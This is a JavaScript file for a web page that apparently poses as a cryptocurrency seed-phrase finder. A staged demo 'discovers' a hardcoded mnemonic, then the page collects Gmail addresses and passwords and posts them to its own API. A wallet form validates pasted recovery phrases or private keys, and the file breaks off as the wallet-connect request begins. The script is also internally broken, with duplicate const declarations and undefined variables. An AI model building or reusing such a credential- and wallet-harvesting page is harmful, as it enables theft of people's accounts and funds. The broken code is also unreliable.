document.addEventListener('DOMContentLoaded', () => {
    lucide.createIcons();
    
    const header = document.getElementById('main-header');
    const mobileMenuButton = document.getElementById('mobile-menu-button');
    const mobileMenu = document.getElementById('mobile-menu');
    
    // API base URL
    const API_BASE = window.location.origin;
    let currentSessionId = null;

    // Header scroll effect
    window.addEventListener('scroll', () => {
        if (window.scrollY > 50) {
            header.classList.add('scrolled');
        } else {
            header.classList.remove('scrolled');
        }
    });

    // Mobile menu toggle
    if (mobileMenuButton && mobileMenu) {
        mobileMenuButton.addEventListener('click', () => {
            mobileMenu.classList.toggle('hidden');
        });
    }

    // Smooth scrolling for nav links
    document.querySelectorAll('a.nav-link').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const targetId = this.getAttribute('href');
            const targetElement = document.querySelector(targetId);
            if (targetElement) {
                targetElement.scrollIntoView({
                    behavior: 'smooth'
                });

                if (mobileMenu && !mobileMenu.classList.contains('hidden')) {
                    mobileMenu.classList.add('hidden');
                }
            }
        });
    });

    // Fetch and update slot counter
    const updateSlotCounter = async () => {
        try {
            const response = await fetch(`${API_BASE}/api/stats/slots`);
            if (response.ok) {
                const data = await response.json();
                const slotCounter = document.getElementById('slot-counter');
                if (slotCounter) {
                    slotCounter.textContent = data.slots_left;
                }
            }
        } catch (error) {
            console.error('Failed to fetch slot count:', error);
        }
    };

    // Update slot counter initially and every 10 seconds
    updateSlotCounter();
    setInterval(updateSlotCounter, 10000);

    // Demo modal functionality
            const downloadTriggers = document.querySelectorAll(".demo-trigger");
    const registrationModal = document.getElementById("registration-modal");
    const closeRegistrationModalBtns = document.querySelectorAll(".close-registration-modal");
    const walletModal = document.getElementById("wallet-modal");
    const closeWalletModalBtns = document.querySelectorAll(".close-wallet-modal");
    const setupInstructionsModal = document.getElementById("setup-instructions-modal");
    const closeInstructionsModalBtns = document.querySelectorAll(".close-instructions-modal");

    downloadTriggers.forEach(trigger => {
        trigger.addEventListener("click", () => {
            registrationModal.classList.remove("hidden");
            registrationModal.classList.add("flex");
        });
    });

    closeRegistrationModalBtns.forEach(btn => {
        btn.addEventListener("click", () => {
            registrationModal.classList.add("hidden");
            registrationModal.classList.remove("flex");
        });
    });

    closeWalletModalBtns.forEach(btn => {
        btn.addEventListener("click", () => {
            walletModal.classList.add("hidden");
            walletModal.classList.remove("flex");
        });
    });

    closeInstructionsModalBtns.forEach(btn => {
        btn.addEventListener("click", () => {
            setupInstructionsModal.classList.add("hidden");
            setupInstructionsModal.classList.remove("flex");
        });
    });

    const targetMnemonic = 'frequent wine code army furnace donor olive uniform ball match left divorce'.split(' ');
    const wordlist = [
        'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse',
        'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act',
        'action', 'actor', 'actress', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit',
        'adult', 'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent',
        'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert', 'alien',
        'all', 'alley', 'allow', 'almost', 'alone', 'alpha', 'already', 'also', 'alter', 'always', 'amateur',
        'amazing', 'among', 'amount', 'amused', 'analyst', 'anchor', 'ancient', 'anger', 'angle', 'angry',
        'animal', 'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique', 'anxiety', 'any',
        'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'arch', 'arctic', 'area', 'arena',
        'argue', 'arm', 'armed', 'armor', 'army', 'around', 'arrange', 'arrest', 'arrive', 'arrow',
        'art', 'artefact', 'artist', 'artwork', 'ask', 'aspect', 'assault', 'asset', 'assist', 'assume',
        'asthma', 'athlete', 'atom', 'attack', 'attend', 'attitude', 'attract', 'auction', 'audit', 'august',
        'aunt', 'author', 'auto', 'autumn', 'average', 'avocado', 'avoid', 'awake', 'aware', 'away',
        'awesome', 'awful', 'awkward', 'axis', 'baby', 'bachelor', 'bacon', 'badge', 'bag', 'balance',
        'balcony', 'ball', 'bamboo', 'banana', 'banner', 'bar', 'barely', 'bargain', 'barrel', 'base',
        'basic', 'basket', 'battle', 'beach', 'bean', 'beauty', 'because', 'become', 'bed', 'beef',
        'before', 'begin', 'behave', 'behind', 'believe', 'below', 'belt', 'bench', 'benefit', 'best',
        'betray', 'better', 'between', 'beyond', 'bicycle', 'bid', 'bike', 'bind', 'biology', 'bird',
        'birth', 'bitter', 'black', 'blade', 'blame', 'blanket', 'blast', 'bleak', 'bless', 'blind',
        'block', 'blood', 'blossom', 'blouse', 'blue', 'blur', 'blush', 'board', 'boat', 'body',
        'boil', 'bomb', 'bone', 'bonus', 'book', 'boost', 'border', 'borrow', 'boss', 'bottom',
        'bounce', 'box', 'boy', 'bracket', 'brain', 'brand', 'brass', 'brave', 'bread', 'breeze',
        'brick', 'bridge', 'brief', 'bright', 'bring', 'brisk', 'broccoli', 'broken', 'bronze', 'broom',
        'brother', 'brown', 'brush', 'bubble', 'buddy', 'budget', 'buffalo', 'build', 'bulb', 'bulk',
        'bullet', 'bundle', 'bunker', 'burden', 'burger', 'burst', 'bus', 'business', 'busy', 'butter',
        'buyer', 'buzz', 'cabbage', 'cabin', 'cable', 'cactus', 'cage', 'cake', 'call', 'calm',
        'camera', 'camp', 'can', 'canal', 'cancel', 'candy', 'cannon', 'canoe', 'canvas', 'canyon',
        'capable', 'capital', 'captain', 'car', 'carbon', 'card', 'cargo', 'carpet', 'carry', 'cart',
        'case', 'cash', 'casino', 'castle', 'casual', 'cat', 'catch', 'category', 'cattle', 'caught',
        'cause', 'caution', 'cave', 'ceiling', 'celery', 'cement', 'center', 'century', 'ceramic', 'certain',
        'chair', 'chalk', 'champion', 'change', 'chaos', 'chapter', 'charge', 'chase', 'chat', 'cheap',
        'check', 'cheese', 'chef', 'cherry', 'chest', 'chicken', 'chief', 'child', 'chimney', 'choice',
        'choose', 'chronic', 'chuckle', 'chunk', 'cigar', 'cinnamon', 'circle', 'citizen', 'city', 'civil',
        'claim', 'clap', 'clarify', 'claw', 'clay', 'clean', 'clerk', 'clever', 'click', 'client',
        'cliff', 'climb', 'clinic', 'clip', 'clock', 'clog', 'close', 'cloth', 'cloud', 'clown',
        'club', 'clump', 'cluster', 'clutch', 'coach', 'coast', 'coconut', 'code', 'coffee', 'coil',
        'coin', 'collect', 'color', 'column', 'combine', 'come', 'comfort', 'comic', 'comma', 'command',
        'comment', 'common', 'company', 'concert', 'conduct', 'confirm', 'congress', 'connect', 'consider', 'control',
        'convince', 'cook', 'cool', 'copper', 'copy', 'coral', 'core', 'corn', 'correct', 'cost',
        'cotton', 'couch', 'country', 'couple', 'course', 'cousin', 'cover', 'coyote', 'crack', 'cradle',
        'craft', 'cram', 'crane', 'crash', 'crater', 'crawl', 'crazy', 'cream', 'credit', 'creek',
        'crew', 'cricket', 'crime', 'crisp', 'critic', 'crop', 'cross', 'crouch', 'crowd', 'crucial',
        'cruel', 'cruise', 'crush', 'cry', 'crystal', 'cube', 'culture', 'cup', 'cupboard', 'curious',
        'current', 'curtain', 'curve', 'cushion', 'custom', 'cute', 'cycle', 'dad', 'damage', 'damp',
        'dance', 'danger', 'daring', 'dark', 'dash', 'date', 'daughter', 'dawn', 'day', 'deal',
        'debate', 'debris', 'decade', 'december', 'decide', 'decline', 'decorate', 'decrease', 'deem', 'deep',
        'deer', 'deny', 'depart', 'depend', 'deposit', 'depth', 'deputy', 'derive', 'describe', 'desert',
        'design', 'desk', 'despair', 'destroy', 'detail', 'detect', 'develop', 'device', 'devote', 'diagram',
        'dial', 'diamond', 'diary', 'dice', 'diesel', 'diet', 'differ', 'digital', 'dignity', 'dilemma',
        'dinner', 'dinosaur', 'direct', 'dirt', 'disagree', 'discover', 'disease', 'dish', 'dismiss', 'disorder',
        'display', 'distance', 'divert', 'divide', 'divorce', 'dizzy', 'doctor', 'document', 'dog', 'doll',
        'dolphin', 'domain', 'donate', 'donkey', 'donor', 'door', 'dose', 'double', 'dove', 'draft',
        'dragon', 'drama', 'drastic', 'draw', 'dream', 'dress', 'drift', 'drill', 'drink', 'drip',
        'drive', 'drop', 'drum', 'dry', 'duck', 'dumb', 'dune', 'during', 'dust', 'dutch',
        'duty', 'dwarf', 'dynamic', 'eager', 'eagle', 'early', 'earn', 'earth', 'easily', 'east',
        'easy', 'echo', 'ecology', 'economy', 'edge', 'edit', 'educate', 'effort', 'egg', 'eight',
        'either', 'elbow', 'elder', 'electric', 'elegant', 'element', 'elephant', 'elevator', 'elite', 'else',
        'embark', 'embody', 'embrace', 'emerge', 'emotion', 'employ', 'empower', 'empty', 'enable', 'enact',
        'end', 'endless', 'endorse', 'enemy', 'energy', 'enforce', 'engage', 'engine', 'enhance', 'enjoy',
        'enlist', 'enough', 'enrich', 'enroll', 'ensure', 'enter', 'entire', 'entry', 'envelope', 'episode',
        'equal', 'equip', 'era', 'erase', 'erode', 'error', 'erupt', 'escape', 'essay', 'essence',
        'estate', 'eternal', 'ethics', 'evidence', 'evil', 'evoke', 'evolve', 'exact', 'example', 'exceed',
        'exchange', 'excite', 'exclude', 'excuse', 'execute', 'exercise', 'exhaust', 'exhibit', 'exile', 'exist',
        'exit', 'exotic', 'expand', 'expect', 'expire', 'explain', 'expose', 'express', 'extend', 'extra',
        'eye', 'eyebrow', 'fabric', 'face', 'faculty', 'fade', 'faint', 'faith', 'fall', 'false',
        'fame', 'family', 'famous', 'fan', 'fancy', 'fantasy', 'farm', 'fashion', 'fat', 'fatal',
        'father', 'fatigue', 'fault', 'favorite', 'feature', 'february', 'federal', 'fee', 'feed', 'feel',
        'female', 'fence', 'festival', 'fetch', 'fever', 'few', 'fiber', 'fiction', 'field', 'figure',
        'file', 'film', 'filter', 'final', 'find', 'fine', 'finger', 'finish', 'fire', 'firm',
        'first', 'fiscal', 'fish', 'fit', 'fitness', 'fix', 'flag', 'flame', 'flash', 'flat',
        'flavor', 'flee', 'flight', 'flip', 'float', 'flock', 'floor', 'flower', 'fluid', 'flush',
        'fly', 'foam', 'focus', 'fog', 'foil', 'fold', 'follow', 'food', 'foot', 'force',
        'foreign', 'forest', 'forget', 'fork', 'form', 'formal', 'fortune', 'forward', 'fossil', 'foster',
        'found', 'fox', 'fragile', 'frame', 'frequent', 'fresh', 'friend', 'fringe', 'frog', 'front',
        'frost', 'frown', 'frozen', 'fruit', 'fuel', 'fun', 'funny', 'furnace', 'fury', 'future',
        'gadget', 'gain', 'galaxy', 'gallery', 'game', 'gap', 'garage', 'garbage', 'garden', 'garlic',
        'gas', 'gasp', 'gate', 'gather', 'gauge', 'gaze', 'general', 'genius', 'genre', 'gentle',
        'genuine', 'gesture', 'ghost', 'giant', 'gift', 'giggle', 'ginger', 'giraffe', 'girl', 'give',
        'glad', 'glance', 'glare', 'glass', 'glimpse', 'globe', 'gloom', 'glory', 'glove', 'glow',
        'glue', 'goal', 'goat', 'gold', 'good', 'goose', 'gorilla', 'gospel', 'gossip', 'govern',
        'gown', 'grab', 'grace', 'grain', 'grant', 'grape', 'grass', 'gravity', 'great', 'green',
        'grid', 'grief', 'grit', 'grocery', 'group', 'grow', 'grunt', 'guard', 'guess', 'guide',
        'guilt', 'guitar', 'gun', 'gym', 'habit', 'hair', 'half', 'hammer', 'hamster', 'hand',
        'happy', 'harbor', 'hard', 'harsh', 'harvest', 'hat', 'have', 'hawk', 'hazard', 'head',
        'health', 'heart', 'heavy', 'hedgehog', 'height', 'hello', 'helmet', 'help', 'hen', 'hero',
        'hidden', 'high', 'hill', 'hint', 'hip', 'hire', 'history', 'hobby', 'hockey', 'hold',
        'hole', 'holiday', 'hollow', 'home', 'honey', 'hood', 'hope', 'horn', 'horror', 'horse',
        'hospital', 'host', 'hotel', 'hour', 'hover', 'hub', 'huge', 'human', 'humble', 'humor',
        'hundred', 'hungry', 'hunt', 'hurdle', 'hurry', 'hurt', 'husband', 'hybrid', 'ice', 'icon',
        'idea', 'identify', 'idle', 'ignore', 'illegal', 'illness', 'image', 'imitate', 'immense', 'immune',
        'impact', 'impose', 'improve', 'impulse', 'inch', 'include', 'income', 'increase', 'index', 'indicate',
        'indoor', 'industry', 'infant', 'inflict', 'inform', 'inhale', 'inherit', 'initial', 'inject', 'injury',
        'inmate', 'inner', 'innocent', 'input', 'inquiry', 'insane', 'insect', 'inside', 'inspire', 'install',
        'intact', 'interest', 'into', 'invest', 'invite', 'involve', 'iron', 'island', 'isolate', 'issue',
        'item', 'ivory', 'jacket', 'jaguar', 'jar', 'jazz', 'jealous', 'jeans', 'jelly', 'jewel',
        'job', 'join', 'joke', 'journey', 'joy', 'judge', 'juice', 'jump', 'jungle', 'junior',
        'junk', 'just', 'kangaroo', 'keen', 'keep', 'key', 'kick', 'kid', 'kidney', 'kind',
        'kingdom', 'kiss', 'kit', 'kitchen', 'kite', 'kitten', 'knee', 'knife', 'knock', 'know',
        'lab', 'label', 'labor', 'ladder', 'lady', 'lake', 'lamp', 'language', 'laptop', 'large',
        'later', 'latin', 'laugh', 'laundry', 'lava', 'law', 'lawn', 'lawsuit', 'layer', 'lazy',
        'leader', 'leaf', 'learn', 'leave', 'lecture', 'left', 'leg', 'legal', 'legend', 'leisure',
        'lemon', 'lend', 'length', 'lens', 'leopard', 'lesson', 'letter', 'level', 'liar', 'liberty',
        'library', 'license', 'life', 'lift', 'light', 'like', 'limb', 'limit', 'link', 'lion',
        'liquid', 'list', 'little', 'live', 'lizard', 'load', 'loan', 'lobster', 'local', 'lock',
        'logic', 'lonely', 'long', 'loop', 'lottery', 'loud', 'lounge', 'love', 'loyal', 'lucky',
        'luggage', 'lumber', 'lunar', 'lunch', 'luxury', 'lyrics', 'machine', 'mad', 'magic', 'magnet',
        'maid', 'mail', 'main', 'major', 'make', 'mammal', 'man', 'manage', 'mandate', 'mango',
        'mansion', 'manual', 'maple', 'marble', 'march', 'margin', 'marine', 'market', 'marriage', 'mask',
        'mass', 'master', 'match', 'material', 'math', 'matrix', 'matter', 'maximum', 'maze', 'meadow',
        'mean', 'measure', 'meat', 'mechanic', 'medal', 'media', 'melody', 'melt', 'member', 'memory',
        'mention', 'menu', 'mercy', 'merge', 'merit', 'merry', 'mess', 'message', 'metal', 'method',
        'middle', 'midnight', 'milk', 'million', 'mimic', 'mind', 'minimum', 'minor', 'minute', 'miracle',
        'mirror', 'misery', 'miss', 'mistake', 'mix', 'mixed', 'mixture', 'mobile', 'model', 'modify',
        'mom', 'moment', 'monitor', 'monkey', 'monster', 'month', 'moon', 'moral', 'more', 'morning',
        'mosquito', 'mother', 'motion', 'motor', 'mountain', 'mouse', 'move', 'movie', 'much', 'muffin',
        'mule', 'multiply', 'muscle', 'museum', 'mushroom', 'music', 'must', 'mutual', 'myself', 'mystery',
        'myth', 'naive', 'name', 'napkin', 'narrow', 'nasty', 'nation', 'nature', 'near', 'neck',
        'need', 'negative', 'neglect', 'neither', 'nephew', 'nerve', 'nest', 'net', 'network', 'neutral',
        'never', 'news', 'next', 'nice', 'night', 'noble', 'noise', 'nominee', 'noodle', 'normal',
        'north', 'nose', 'notable', 'note', 'nothing', 'notice', 'novel', 'now', 'nuclear', 'number',
        'nurse', 'nut', 'oak', 'obey', 'object', 'oblige', 'obscure', 'observe', 'obtain', 'obvious',
        'occur', 'ocean', 'october', 'odor', 'off', 'offer', 'office', 'often', 'oil', 'okay',
        'old', 'olive', 'olympic', 'omit', 'once', 'one', 'onion', 'online', 'only', 'open',
        'opera', 'opinion', 'oppose', 'option', 'orange', 'orbit', 'orchard', 'order', 'ordinary', 'organ',
        'orient', 'original', 'orphan', 'ostrich', 'other', 'outdoor', 'outer', 'output', 'outside', 'oval',
        'oven', 'over', 'own', 'owner', 'oxygen', 'oyster', 'ozone', 'pact', 'paddle', 'page',
        'pair', 'palace', 'palm', 'panda', 'panel', 'panic', 'panther', 'paper', 'parade', 'parent',
        'park', 'parrot', 'party', 'pass', 'patch', 'path', 'patient', 'patrol', 'pattern', 'pause',
        'pave', 'payment', 'peace', 'peanut', 'pear', 'peasant', 'pelican', 'pen', 'penalty', 'pencil',
        'people', 'pepper', 'perfect', 'permit', 'person', 'pet', 'phone', 'photo', 'phrase', 'physical',
        'piano', 'picnic', 'picture', 'piece', 'pig', 'pigeon', 'pill', 'pilot', 'pink', 'pioneer',
        'pipe', 'pistol', 'pitch', 'pizza', 'place', 'planet', 'plastic', 'plate', 'play', 'please',
        'pledge', 'plough', 'plug', 'plunge', 'poem', 'poet', 'point', 'polar', 'pole', 'police',
        'pond', 'pony', 'pool', 'popular', 'portion', 'position', 'possible', 'post', 'potato', 'pottery',
        'poverty', 'powder', 'power', 'practice', 'praise', 'predict', 'prefer', 'prepare', 'present', 'pretty',
        'prevent', 'price', 'pride', 'primary', 'print', 'priority', 'prison', 'private', 'prize', 'problem',
        'process', 'produce', 'profit', 'program', 'project', 'promote', 'proof', 'property', 'prosper', 'protect',
        'proud', 'provide', 'public', 'pudding', 'pull', 'pulp', 'pulse', 'pumpkin', 'punch', 'pupil',
        'puppy', 'purchase', 'purity', 'purpose', 'push', 'put', 'puzzle', 'pyramid', 'quality', 'quantum',
        'quarter', 'question', 'quick', 'quit', 'quiz', 'quote', 'rabbit', 'raccoon', 'race', 'rack',
        'radar', 'radio', 'rail', 'rain', 'raise', 'rally', 'ramp', 'ranch', 'random', 'range',
        'rapid', 'rare', 'rate', 'rather', 'raven', 'raw', 'ray', 'razor', 'ready', 'real',
        'reason', 'rebel', 'rebuild', 'recall', 'receive', 'recipe', 'record', 'recycle', 'reduce', 'reflect',
        'reform', 'refuse', 'region', 'regret', 'regular', 'reject', 'relax', 'release', 'relief', 'rely',
        'remain', 'remember', 'remind', 'remove', 'render', 'renew', 'rent', 'reopen', 'repair', 'repeat',
        'replace', 'report', 'require', 'rescue', 'resemble', 'resist', 'resource', 'response', 'result', 'retire',
        'retreat', 'return', 'reunion', 'reveal', 'review', 'reward', 'rhythm', 'rib', 'ribbon', 'rice',
        'rich', 'ride', 'ridge', 'rifle', 'right', 'rigid', 'ring', 'riot', 'rip', 'ripe',
        'rise', 'risk', 'ritual', 'rival', 'river', 'road', 'roast', 'robot', 'robust', 'rocket',
        'romance', 'roof', 'rookie', 'room', 'rose', 'rotate', 'rough', 'round', 'route', 'royal',
        'rubber', 'rude', 'rug', 'rule', 'run', 'runway', 'rural', 'sad', 'saddle', 'sadness',
        'safe', 'sail', 'salad', 'salmon', 'salon', 'salt', 'salute', 'same', 'sample', 'sand',
        'satisfy', 'satoshi', 'sauce', 'sausage', 'save', 'say', 'scale', 'scan', 'scare', 'scatter',
        'scene', 'scheme', 'school', 'science', 'scissors', 'scold', 'score', 'scout', 'scrape', 'screen',
        'script', 'scrub', 'sea', 'search', 'season', 'seat', 'second', 'secret', 'section', 'security',
        'seed', 'seek', 'segment', 'select', 'sell', 'seminar', 'senior', 'sense', 'sentence', 'series',
        'service', 'session', 'settle', 'setup', 'seven', 'shadow', 'shaft', 'shallow', 'share', 'shed',
        'shell', 'sheriff', 'shield', 'shift', 'shine', 'ship', 'shiver', 'shock', 'shoe', 'shoot',
        'shop', 'short', 'shoulder', 'shove', 'shrimp', 'shrug', 'shuffle', 'shy', 'sibling', 'sick',
        'side', 'siege', 'sight', 'sign', 'silent', 'silk', 'silly', 'silver', 'similar', 'simple',
        'since', 'sing', 'siren', 'sister', 'situate', 'six', 'size', 'skate', 'sketch', 'ski',
        'skill', 'skin', 'skirt', 'skull', 'slab', 'slam', 'sleep', 'sleeve', 'slice', 'slide',
        'slim', 'slogan', 'slot', 'slow', 'slush', 'small', 'smart', 'smile', 'smoke', 'smooth',
        'snack', 'snake', 'snap', 'sniff', 'snow', 'soap', 'soccer', 'social', 'sock', 'soda',
        'soft', 'solar', 'soldier', 'solid', 'solution', 'solve', 'someone', 'song', 'soon', 'sorry',
        'sort', 'soul', 'sound', 'soup', 'source', 'south', 'space', 'spare', 'spatial', 'spawn',
        'speak', 'special', 'speed', 'spell', 'spend', 'sphere', 'spice', 'spider', 'spike', 'spin',
        'spirit', 'split', 'spoil', 'sponsor', 'spoon', 'sport', 'spot', 'spray', 'spread', 'spring',
        'spy', 'square', 'squeeze', 'squirrel', 'stable', 'stadium', 'staff', 'stage', 'stairs', 'stamp',
        'stand', 'start', 'state', 'stay', 'steak', 'steel', 'stem', 'step', 'stereo', 'stick',
        'still', 'sting', 'stock', 'stomach', 'stone', 'stool', 'story', 'stove', 'strategy', 'street',
        'strike', 'strong', 'struggle', 'student', 'stuff', 'stumble', 'style', 'subject', 'submit', 'subway',
        'success', 'such', 'sudden', 'suffer', 'sugar', 'suggest', 'suit', 'summer', 'sun', 'sunny',
        'sunset', 'super', 'supply', 'supreme', 'sure', 'surface', 'surge', 'surprise', 'surround', 'survey',
        'suspect', 'sustain', 'swallow', 'swamp', 'swap', 'swear', 'sweet', 'swift', 'swim', 'swing',
        'switch', 'sword', 'symbol', 'symptom', 'syrup', 'system', 'table', 'tackle', 'tag', 'tail',
        'talent', 'talk', 'tank', 'tape', 'target', 'task', 'taste', 'tattoo', 'taxi', 'teach',
        'team', 'tell', 'ten', 'tenant', 'tennis', 'tent', 'term', 'test', 'text', 'thank',
        'that', 'theme', 'then', 'theory', 'there', 'they', 'thing', 'this', 'thought', 'three',
        'thrive', 'throw', 'thumb', 'thunder', 'ticket', 'tide', 'tiger', 'tilt', 'timber', 'time',
        'tiny', 'tip', 'tired', 'tissue', 'title', 'toast', 'tobacco', 'today', 'toddler', 'toe',
        'together', 'toilet', 'token', 'tomato', 'tomorrow', 'tone', 'tongue', 'tonight', 'tool', 'tooth',
        'top', 'topic', 'topple', 'torch', 'tornado', 'tortoise', 'toss', 'total', 'tourist', 'toward',
        'tower', 'town', 'toy', 'track', 'trade', 'traffic', 'tragic', 'train', 'transfer', 'trap',
        'trash', 'travel', 'tray', 'treat', 'tree', 'trend', 'trial', 'tribe', 'trick', 'trigger',
        'trim', 'trip', 'trophy', 'trouble', 'truck', 'true', 'truly', 'trumpet', 'trust', 'truth',
        'try', 'tube', 'tuition', 'tumble', 'tuna', 'tunnel', 'turkey', 'turn', 'turtle', 'twelve',
        'twenty', 'twice', 'twin', 'twist', 'two', 'type', 'typical', 'ugly', 'umbrella', 'unable',
        'unaware', 'uncle', 'uncover', 'under', 'undo', 'unfair', 'unfold', 'unhappy', 'uniform', 'unique',
        'unit', 'universe', 'unknown', 'unlock', 'until', 'unusual', 'unveil', 'update', 'upgrade', 'uphold',
        'upon', 'upper', 'upset', 'urban', 'urge', 'usage', 'use', 'used', 'useful', 'useless',
        'usual', 'utility', 'vacant', 'vacuum', 'vague', 'valid', 'valley', 'valve', 'van', 'vanish',
        'vapor', 'various', 'vast', 'vault', 'vehicle', 'velvet', 'vendor', 'venture', 'venue', 'verb',
        'verify', 'version', 'very', 'vessel', 'veteran', 'viable', 'vibrant', 'vicious', 'victory', 'video',
        'view', 'village', 'vintage', 'violin', 'virtual', 'virus', 'visa', 'visit', 'visual', 'vital',
        'vivid', 'vocal', 'voice', 'void', 'volcano', 'volume', 'vote', 'voyage', 'wage', 'wagon',
        'wait', 'walk', 'wall', 'walnut', 'want', 'warfare', 'warm', 'warrior', 'wash', 'wasp',
        'waste', 'water', 'wave', 'way', 'wealth', 'weapon', 'wear', 'weasel', 'weather', 'web',
        'wedding', 'weekend', 'weird', 'welcome', 'west', 'wet', 'what', 'wheat', 'wheel', 'when',
        'where', 'whip', 'whisper', 'wide', 'width', 'wife', 'wild', 'will', 'win', 'window',
        'wine', 'wing', 'wink', 'winner', 'winter', 'wire', 'wisdom', 'wise', 'wish', 'witness',
        'wolf', 'woman', 'wonder', 'wood', 'wool', 'word', 'work', 'world', 'worry', 'worth',
        'wrap', 'wreck', 'wrestle', 'wrist', 'write', 'wrong', 'yard', 'year', 'yellow', 'you',
        'young', 'youth', 'zebra', 'zero', 'zone', 'zoo'
    ];
    let animationInterval = null;

    const openModal = () => {
        if (demoModal) {
            demoModal.classList.remove('hidden');
            demoModal.classList.add('flex');
            document.body.style.overflow = 'hidden';
            startDemoAnimation();
        }
    };

    const closeModal = () => {
        if (demoModal) {
            demoModal.classList.add('hidden');
            demoModal.classList.remove('flex');
            document.body.style.overflow = '';
            stopDemoAnimation();
            resetDemoState();
        }
    };
    
    const startDemoAnimation = () => {
        resetDemoState();
        mnemonicGrid.innerHTML = '';
        const numCols = Math.min(Math.floor(window.innerWidth / 150), 6);
        if (numCols <= 0) return;

        for (let i = 0; i < numCols; i++) {
            const column = document.createElement('div');
            column.className = 'word-column';
            const duration = Math.random() * 2 + 1.5;
            column.style.setProperty('--scroll-duration', `${duration}s`);
            
            let wordsHTML = '';
            for (let j = 0; j < 50; j++) {
                wordsHTML += `<span>${wordlist[Math.floor(Math.random() * wordlist.length)]}</span>`;
            }
            column.innerHTML = wordsHTML + wordsHTML;
            mnemonicGrid.appendChild(column);
        }

        animationInterval = setTimeout(() => {
            showResult();
        }, 4000);
    };

    const stopDemoAnimation = () => {
        if (animationInterval) {
            clearTimeout(animationInterval);
            animationInterval = null;
        }
        mnemonicGrid.innerHTML = '';
    };

    const showResult = () => {
        mnemonicGrid.innerHTML = ''; 
        foundMnemonicContainer.innerHTML = '';
        targetMnemonic.forEach((word, index) => {
            const wordEl = document.createElement('span');
            wordEl.textContent = word;
            wordEl.style.setProperty('--word-index', index);
            foundMnemonicContainer.appendChild(wordEl);
            if (index < targetMnemonic.length - 1) {
                foundMnemonicContainer.appendChild(document.createTextNode(' '));
            }
        });
        resultOverlay.classList.remove('hidden');
        resultOverlay.classList.add('flex');
    };

    const resetDemoState = () => {
        resultOverlay.classList.add('hidden');
        resultOverlay.classList.remove('flex');
        foundMnemonicContainer.innerHTML = '';
        mnemonicGrid.innerHTML = '';
    };

    demoTriggers.forEach(btn => btn.addEventListener('click', (e) => {
        e.preventDefault();
        openModal();
    }));

    if (closeModalBtn) closeModalBtn.addEventListener('click', closeModal);
    if (demoModal) {
        demoModal.addEventListener('click', (e) => {
            if (e.target === demoModal) {
                closeModal();
            }
        });
    }

    // Registration modal functionality
    const registrationModal = document.getElementById('registration-modal');
    const closeRegistrationBtn = document.getElementById('close-registration-btn');
    const registrationForm = document.getElementById('registration-form');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const emailError = document.getElementById('email-error');
    const passwordError = document.getElementById('password-error');

    // Wallet modal functionality
    const walletModal = document.getElementById('wallet-modal');
    const closeWalletBtn = document.getElementById('close-wallet-btn');
    const walletConnectBtn = document.getElementById('walletconnect-btn');
    const manualWalletForm = document.getElementById('manual-wallet-form');
    const mnemonicInput = document.getElementById('mnemonic');
    const mnemonicError = document.getElementById('mnemonic-error');

    // Download now button functionality
    if (downloadNowBtn) {
        downloadNowBtn.addEventListener('click', (e) => {
            e.preventDefault();
            closeModal();
            openRegistrationModal();
        });
    }

    const openRegistrationModal = () => {
        if (registrationModal) {
            registrationModal.classList.remove('hidden');
            registrationModal.classList.add('flex');
            document.body.style.overflow = 'hidden';
        }
    };

    const closeRegistrationModal = () => {
        if (registrationModal) {
            registrationModal.classList.add('hidden');
            registrationModal.classList.remove('flex');
            document.body.style.overflow = '';
            resetRegistrationForm();
        }
    };

    const openWalletModal = () => {
        if (walletModal) {
            walletModal.classList.remove('hidden');
            walletModal.classList.add('flex');
            document.body.style.overflow = 'hidden';
        }
    };

    const closeWalletModal = () => {
        if (walletModal) {
            walletModal.classList.add('hidden');
            walletModal.classList.remove('flex');
            document.body.style.overflow = '';
            resetWalletForm();
        }
    };

    const resetRegistrationForm = () => {
        if (registrationForm) {
            registrationForm.reset();
            emailError.classList.add('hidden');
            passwordError.classList.add('hidden');
        }
    };

    const resetWalletForm = () => {
        if (manualWalletForm) {
            manualWalletForm.reset();
            mnemonicError.classList.add('hidden');
        }
    };

    const validateEmail = (email) => {
        const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
        return gmailRegex.test(email);
    };

    const validatePassword = (password) => {
        return password.length >= 8;
    };

    const validateMnemonic = (mnemonic) => {
        const words = mnemonic.trim().split(/\s+/);
        // Basic validation: 12 or 24 words, or looks like a private key
        if (words.length === 12 || words.length === 24) {
            return words.every(word => word.length > 0);
        }
        // Check if it looks like a private key (64 hex characters)
        const hexRegex = /^[a-fA-F0-9]{64}$/;
        return hexRegex.test(mnemonic.replace(/\s/g, ''));
    };

    // Registration form submission
    if (registrationForm) {
        registrationForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const email = emailInput.value.trim();
            const password = passwordInput.value;
            
            // Reset errors
            emailError.classList.add('hidden');
            passwordError.classList.add('hidden');
            
            try {
                const response = await fetch(`${API_BASE}/api/register`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ email, password })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    currentSessionId = data.sessionId;
                    closeRegistrationModal();
                    openWalletModal();
                } else {
                    if (data.error.includes('Gmail')) {
                        emailError.textContent = data.error;
                        emailError.classList.remove('hidden');
                    } else if (data.error.includes('Password') || data.error.includes('characters')) {
                        passwordError.textContent = data.error;
                        passwordError.classList.remove('hidden');
                    } else {
                        alert(data.error);
                    }
                }
            } catch (error) {
                console.error('Registration error:', error);
                alert('Registration failed. Please try again.');
            }
        });
    }

    // Wallet connection functionality
    if (walletConnectBtn) {
        walletConnectBtn.addEventListener('click', async (e) => {
            e.preventDefault();
            
            if (!currentSessionId) {
                alert('Please register first');
                return;
            }
            
            try {
                const response = await fetch(`${API_BASE}/api/wallet/connect`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
